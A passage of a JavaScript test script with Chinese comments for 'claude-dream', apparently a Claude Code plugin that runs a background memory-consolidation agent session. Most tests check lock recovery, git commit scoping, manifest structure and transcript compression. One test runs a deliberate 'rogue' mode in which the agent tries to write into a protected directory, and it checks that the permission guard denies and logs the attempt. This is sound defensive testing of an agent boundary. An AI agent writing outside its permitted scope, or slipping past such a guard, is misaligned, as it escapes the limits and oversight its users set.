  console.log(`\n=== PBI-01.2·AC2 作恶模式指定目标为底片目录（D4 点烟），沙箱: ${sandbox} ===`);

  const target = '.claude/negatives/rogue-attempt.md';
  const result = runNode(path.join(SRC, 'run-dream.mjs'), ['--rogue', `--target=${target}`, sandbox], { cwd: sandbox });
  check('指定底片目录为目标：rogue 模式跑完退出码为 0（越界被拒不算梦失败）', result.status === 0, result.stderr);

  let summary = null;
  try {
    summary = JSON.parse(result.stdout);
  } catch {
    // ignore
  }
  check('summary.rogueTargetPath 确实是指定的底片目录路径', summary?.rogueTargetPath === target, JSON.stringify(summary?.rogueTargetPath));
  check('AC2 红：指向底片目录的越界文件确实没有落盘', !existsSync(path.join(sandbox, target)));
  check('summary.rogueBlocked 为 true', summary?.rogueBlocked === true);

  if (summary?.runId) {
    const logPath = path.join(sandbox, '.claude', 'dream', `${summary.runId}-canUseTool.log`);
    const invocations = existsSync(logPath)
      ? readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l))
      : [];
    check(
      'AC2 拒绝日志里能看到该路径（底片目录内具体文件）',
      invocations.some((i) => i.decision === 'deny' && i.input?.file_path?.replace(/\\/g, '/').includes('.claude/negatives/rogue-attempt.md'))
    );
    check(
      '验收打回修复：日志条目的顶层 targetPath 字段也能独立定位到底片目录内具体文件',
      invocations.some((i) => i.decision === 'deny' && typeof i.targetPath === 'string' && i.targetPath.replace(/\\/g, '/').includes('.claude/negatives/rogue-attempt.md'))
    );
  }

  return sandbox;
}

async function testStaleLockDetection() {
  // D3 review 三轮抓到的坑：锁只查"文件在不在"，上一场梦硬死（kill -9 / 断电 / OOM）没走到 finally 的
  // releaseLock 时 dream.lock 永久残留，之后每次触发都撞 EEXIST 直接退出，梦从此停摆、无人发现。
  // 修复靠锁里记的 pid 判定存活：pid 死 = 残留可清，pid 活 = 真在跑别抢。三条边界钉进回归。
  console.log('\n=== 崩溃残留锁自愈（stale lock 判定 + 清锁重抢，不起会话） ===');
  const { isStaleLock, acquireLock, releaseLock } = await import('../src/trigger-check.mjs');
  const tmpDir = mkdtempSync(path.join(os.tmpdir(), 'claude-dream-lock-test-'));
  const lockPath = path.join(tmpDir, 'dream.lock');

  // 死 pid：spawnSync 同步跑一个立即退出的子进程，返回时该 pid 已确定查无此进程。
  const dead = spawnSync(process.execPath, ['-e', 'process.exit(0)'], { windowsHide: true });
  writeFileSync(lockPath, JSON.stringify({ pid: dead.pid, acquiredAt: new Date().toISOString() }));
  check('死 pid 的锁判定为 stale（崩溃残留）', isStaleLock(lockPath) === true);
  check('残留锁被清掉并重新获取（acquireLock 返回 true）', acquireLock(lockPath) === true);
  check('锁已换成当前进程的 pid', JSON.parse(readFileSync(lockPath, 'utf8')).pid === process.pid);

  // 活 pid：写一把"当前进程自己"的锁，必然存活，acquireLock 不该抢。
  releaseLock(lockPath);
  writeFileSync(lockPath, JSON.stringify({ pid: process.pid, acquiredAt: new Date().toISOString() }));
  check('活 pid 的锁判定为非 stale（别抢活锁）', isStaleLock(lockPath) === false);
  check('活锁不被抢（acquireLock 返回 false）', acquireLock(lockPath) === false);

  // 损坏锁：读不出 pid，按残留处理（宁可清掉也不永久卡死）。
  releaseLock(lockPath);
  writeFileSync(lockPath, 'not-json-at-all');
  check('读不出 pid 的损坏锁按残留处理', isStaleLock(lockPath) === true);

  releaseLock(lockPath);
  rmSync(tmpDir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
}

async function testCommitPathspecDoesNotSwallowHumanStaged() {
  // D3 review 三轮抓到的坑：git commit 不带 pathspec 时提交整个暂存区，人类会话中途手动 git add 的
  // 无关文件会被连坐吞进 dream: 提交。修复 = stagedFiles 和 commit 都限定与 add 相同的 pathspec。
  // 预置一个人类 staged 的无关文件，跑一场梦，断言它既不进 dream: 提交、也不被 reset 清掉。
  // 复审又指出：梦前快照的 commit 分支（有运行态文件 + 有待提交 memory 改动）从未被测试跑到，导致
  // 发现 1 漏网。这里一并预置这两个条件，让 preDreamSnapshot 真走进 commit 分支，验证空 .claude/dream
  // 目录不再让 commit -- 报 "pathspec did not match"。
  const sandbox = makeSandbox('pathspec');
  const paths = dreamPaths(sandbox);
  console.log(`\n=== D3 三轮回归：dream 提交不吞人类暂存 + 梦前快照空目录不炸（沙箱: ${sandbox}） ===`);

  // 1) 人类会话中途 stage 一个无关文件
  writeFileSync(path.join(sandbox, 'README.md'), 'human staged change\n');
  git(sandbox, ['add', 'README.md']);

  // 2) 让梦前快照有"待提交 memory 改动" + ".claude/dream 有运行态文件"，迫使 preDreamSnapshot 走进
  //    commit 分支（这正是复审发现 1 的空目录 pathspec 会炸的场景）
  mkdirSync(paths.dreamDir, { recursive: true });
  writeFileSync(paths.memoryIndex, readFileSync(paths.memoryIndex, 'utf8') + '\n<!-- pathspec 回归钉子 -->\n');
  writeFileSync(paths.lastDreamState, JSON.stringify({ lastDreamAt: '2020-01-01T00:00:00.000Z', status: 'running' }));

  const result = runNode(path.join(SRC, 'run-dream.mjs'), [sandbox], { cwd: sandbox });
  check('直接跑 run-dream 正常返回（退出码 0）', result.status === 0, result.stderr);

  // 3) 梦前快照提交成功（修复前这里会因空 .claude/dream 目录报 did not match 而整场梦中断）
  const preSha = git(sandbox, ['log', '--oneline', '--grep=^dream-pre:', '-1', '--format=%H']);
  check('梦前快照 dream-pre: 提交成功（空 .claude/dream 目录没炸）', !!preSha, preSha);
  if (preSha) {
    const preFiles = git(sandbox, ['show', '--name-only', '--pretty=format:', preSha]).split('\n').map((l) => l.trim()).filter(Boolean);
    check('dream-pre 提交不含运行态文件 last-dream.json', !preFiles.includes('.claude/dream/last-dream.json'), preFiles.join(', '));
    check('dream-pre 提交不含人类 README.md', !preFiles.includes('README.md'));
  }

  // 4) dream: 提交不含人类 README，README 仍保持 staged
  const dreamSha = git(sandbox, ['log', '--oneline', '--grep=^dream:', '-1', '--format=%H']);
  const dreamFiles = dreamSha
    ? git(sandbox, ['show', '--name-only', '--pretty=format:', dreamSha]).split('\n').map((l) => l.trim()).filter(Boolean)
    : [];
  check('dream: 提交不含人类无关的暂存文件 README.md', dreamFiles.length > 0 && !dreamFiles.includes('README.md'), dreamFiles.join(', '));

  const staged = git(sandbox, ['diff', '--cached', '--name-only']).split('\n').filter(Boolean);
  check('人类暂存的 README.md 仍保持 staged（未被吞、未被 reset）', staged.includes('README.md'), staged.join(', '));

  return sandbox;
}

function testPluginManifestShape() {
  // D3 review 抓到的坑：hooks.json 曾经缺顶层 "hooks" 包裹键（{"SessionEnd":[...]} 而不是
  // {"hooks":{"SessionEnd":[...]}}）——那是 .claude/settings.json 的格式，不是插件 hooks.json 的格式，
  // Claude Code 的插件加载器大概率根本不认。这类 schema 错误纯手工排查容易漏，写进自证脚本才靠得住。
  console.log('\n=== 插件清单结构形状检查（对应 AC1，纯静态，不起会话） ===');

  const pluginJsonPath = path.join(PLUGIN_ROOT, '.claude-plugin', 'plugin.json');
  const hooksJsonPath = path.join(PLUGIN_ROOT, 'hooks', 'hooks.json');

  let pluginJson = null;
  try {
    pluginJson = JSON.parse(readFileSync(pluginJsonPath, 'utf8'));
  } catch {
    // leave null，下面的 check 会失败并报出来
  }
  check('plugin.json 存在且是合法 JSON', !!pluginJson);
  check('plugin.json.name 是 "claude-dream"', pluginJson?.name === 'claude-dream');

  let hooksJson = null;
  try {
    hooksJson = JSON.parse(readFileSync(hooksJsonPath, 'utf8'));
  } catch {
    // ignore
  }
  check('hooks.json 存在且是合法 JSON', !!hooksJson);
  check('hooks.json 顶层有 "hooks" 包裹键（不是裸 {"SessionEnd":[...]}）', !!hooksJson?.hooks && !hooksJson?.SessionEnd);
  for (const event of ['SessionEnd', 'SessionStart']) {
    const entries = hooksJson?.hooks?.[event];
    check(`hooks.json.hooks.${event} 是非空数组`, Array.isArray(entries) && entries.length > 0);
    const cmd = entries?.[0]?.hooks?.[0];
    check(
      `${event} 第一条 hook 的 command 用 \${CLAUDE_PLUGIN_ROOT} 引用脚本`,
      typeof cmd?.command === 'string' && cmd.command.includes('${CLAUDE_PLUGIN_ROOT}') && cmd.type === 'command'
    );
  }

  const marketplacePath = path.join(PLUGIN_ROOT, '..', '.claude-plugin', 'marketplace.json');
  if (existsSync(marketplacePath)) {
    const marketplace = JSON.parse(readFileSync(marketplacePath, 'utf8'));
    const entry = marketplace.plugins?.find((p) => p.name === 'claude-dream');
    check('marketplace.json 里的 claude-dream 条目 source 指向 ./claude-dream', entry?.source === './claude-dream');
  }
}

function testNegativesZeroApiAndCompressUnit() {
  // AC2「验法写死：压缩链路不引用 Agent SDK」——静态源码检查，不是运行时行为断言：
  // 直接读目录下每个源文件，确认没有一处 import 了 SDK 包名。Sprint-3 起机械管线（engine/）
  // 与受信任执行通道（lib/）纳入同一检查（D3 review 建议1）：除 run-dream.mjs 的 rogue 分支外，
  // 受信任代码一律不得引用 SDK 包名。
  console.log('\n=== 零 API 静态检查（negatives/engine/lib）+ compress.mjs 纯函数单测（不起会话） ===');

  const sdkPackageName = '@anthropic-ai/claude-agent-sdk';
  const negativesDir = path.join(SRC, 'negatives');
  for (const sub of ['negatives', 'engine', 'lib']) {
    const dir = path.join(SRC, sub);
    for (const file of readdirSync(dir).filter((f) => f.endsWith('.mjs'))) {
      const content = readFileSync(path.join(dir, file), 'utf8');
      check(`AC2 零 API：${sub}/${file} 不引用 ${sdkPackageName}`, !content.includes(sdkPackageName));
    }
  }

  return import(pathToFileURL(path.join(negativesDir, 'compress.mjs')).href).then(({ compressEntries }) => {
    const marker = 'UNIT-TEST-MARKER-abc123';
    const mixedMarker = 'MIXED-CONTENT-MARKER-xyz789';
    const entries = [
      { type: 'user', message: { role: 'user', content: [{ type: 'text', text: marker }] } },
      { type: 'user', message: { role: 'user', content: [{ tool_use_id: 't1', type: 'tool_result', content: 'x'.repeat(500), is_error: false }] } },
      { type: 'assistant', message: { content: [{ type: 'thinking', thinking: 'y'.repeat(500) }] } },
      { type: 'assistant', message: { content: [{ type: 'text', text: '回复文本' }] } },
      { type: 'this-type-does-not-exist-yet', weird: true },
      // D3 review 回归钉子：以前 tool_result 一出现就整条早退，同数组里的文本会被吞掉。
      { type: 'user', message: { role: 'user', content: [{ tool_use_id: 't2', type: 'tool_result', content: 'ok', is_error: false }, { type: 'text', text: mixedMarker }] } },
      // D3 review 回归钉子：assistant content 里没列举过的子类型（真实存在的 redacted_thinking）
      // 以前会静默消失，现在要留一行可见的桩且计进 stats.subitemUnknownCount。
      { type: 'assistant', message: { content: [{ type: 'redacted_thinking', data: 'REDACTED-MARKER-should-be-visible' }] } },
      // D3 review 回归钉子：queue-operation 非 remove 以前无条件丢弃，包括未来才会出现的值——
      // 现在只有 enqueue/dequeue/popAll 这三个核实过的值丢弃，其余走未知留痕。
      { type: 'queue-operation', operation: 'enqueue', sessionId: 's1', timestamp: 't' },
      { type: 'queue-operation', operation: 'future-unknown-op', sessionId: 's1', timestamp: 't' },
      // D3 review 回归钉子：未知类型单条硬上限——超过 100KB 应截断，不是无限保真。
      { type: 'oversized-unknown-type', blob: 'z'.repeat(200 * 1024) },
    ];
    const { markdown, stats } = compressEntries(entries);

    check('AC3 用户文本原文保留（两种结构之一：content 数组含 text）', markdown.includes(marker));
    check('AC3② 工具返回（以 user 角色记录）摘要化：不含完整 500 字正文', !markdown.includes('x'.repeat(500)));
    check('AC3④ assistant thinking 摘要化：不含完整 500 字正文', !markdown.includes('y'.repeat(500)));
    check('assistant 正文原样保留', markdown.includes('回复文本'));
    check('AC3③ 未知类型保守保留＋留痕：标记 unknown 且原样带 raw', markdown.includes('UNKNOWN') && markdown.includes('this-type-does-not-exist-yet'));
    check('stats.byKind.unknown 计数正确', stats.byKind.unknown >= 1, JSON.stringify(stats.byKind));

    check('D3 回归：user 混合内容（tool_result+text）两者都保留，不早退丢文本', markdown.includes(mixedMarker));
    check('D3 回归：assistant 未知子类型（redacted_thinking）留痕可见，不静默消失', markdown.includes('REDACTED-MARKER-should-be-visible'));
    check('D3 回归：stats.subitemUnknownCount 反映未知子类型（不被 entry 整体 kind 盖住）', stats.subitemUnknownCount >= 1, JSON.stringify(stats));
    // 全部 10 条 entries 里唯一该走 discard 的只有 enqueue 那一条（其余全是 retain/stub/unknown）——
    // 精确等于 1 才说明 enqueue 真的被丢弃了，不是巧合凑出来的数字。
    check('D3 回归：queue-operation 已知值（enqueue）仍无痕丢弃', stats.byKind.discard === 1, JSON.stringify(stats.byKind));
    check('D3 回归：queue-operation 未知值走未知留痕，不再无条件丢弃', markdown.includes('future-unknown-op'));
    check('D3 回归：超大未知类型条目按硬上限截断，不无限膨胀', markdown.includes('截断') && !markdown.includes('z'.repeat(150 * 1024)));
  });
}

const sandboxes = [];
try {
  testScopeGuardUnit();
  testPluginManifestShape();
  // F2 修复（D3 review）：返回值（enabled:false 闸门沙箱）必须进清理名单，不留临时目录垃圾。
  sandboxes.push(await testValveConfig());
  await testNegativesZeroApiAndCompressUnit();
  await testNegativesLargeTranscriptStress();
  await testNotebookEditFieldName();
  await testMechanicalChecks();
  await testStaleLockDetection();
  sandboxes.push(await testFullChainAndRevertAndCooldownAndRecursion());
  sandboxes.push(await testNegativesFaultInjection());
  await testBackfillNegatives();
  sandboxes.push(await testConcurrentTriggerLock());
  sandboxes.push(await testRogue());
  sandboxes.push(await testRogueTargetsNegativesDir());
  sandboxes.push(await testCommitPathspecDoesNotSwallowHumanStaged());
} catch (err) {
  // 测试组抛出的未捕获异常此前会被 finally 里的 process.exit(0) 静默吞掉——异常挂起时
  // failed 还是空的，exit(0) 直接把一次中途夭折的测试跑伪装成"全绿"。这是「从没红过的绿灯」
  // 的活标本（D4）：夭折当通过。补 catch 把夭折显性化为一条 FAIL，退出码跟着红。
  check('测试序列未中途夭折（无未捕获异常）', false, String(err?.stack ?? err));
} finally {
  const failed = results.filter((r) => !r.pass);
  console.log(`\n=== 结果：${results.length - failed.length}/${results.length} 通过 ===`);
  if (failed.length) {
    console.log('失败项:');
    for (const f of failed) console.log(`  - ${f.name}${f.detail ? ' :: ' + f.detail : ''}`);
  }
  console.log(`\n沙箱目录（失败时保留供排查，全绿可删）: ${sandboxes.join(', ')}`);
  if (!failed.length) {
    for (const s of sandboxes) {
      try {
        // Windows 下 git.exe/杀毒软件等偶发地在进程刚退出那一刻仍占着文件句柄，rmSync 会报
        // 瞬时性的 EPERM——maxRetries/retryDelay 是 Node 官方给这个场景的解法（间隔重试等锁自然释放）。
        // 清理失败本身不该让一次全绿的测试跑报出非零退出码：这是收尾动作,不是断言。
        rmSync(s, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
      } catch (err) {
        console.log(`（沙箱清理失败，忽略，不影响测试结果）: ${s} :: ${String(err?.message ?? err)}`);
      }
    }
  }
  process.exit(failed.length ? 1 : 0);
}
